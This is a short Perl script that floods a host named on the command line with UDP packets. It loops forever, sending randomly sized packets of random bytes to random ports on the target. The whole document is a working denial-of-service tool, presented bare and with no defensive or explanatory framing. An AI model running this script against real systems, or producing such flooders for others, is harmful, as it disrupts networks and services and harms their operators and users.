#!/usr/bin/perl
use strict;
use warnings;
use Socket;

my $target_host = $ARGV[0] or die "Usage: $0 <target_host>\n";

while (1) {
    my $local_port = int(rand(65535));
    my $target_port = int(rand(65535));
    my $packet_size = int(rand(1024-64)+64) ;
    my $packet_data = join("", map { chr(int(rand(256))) } 1..$packet_size);
    socket(my $socket, PF_INET, SOCK_DGRAM, getprotobyname('udp'));
    bind($socket, sockaddr_in($local_port, INADDR_ANY));
    send($socket, pack("a$packet_size", $packet_data), 0, sockaddr_in($target_port, inet_aton($target_host)));
    close($socket);
}
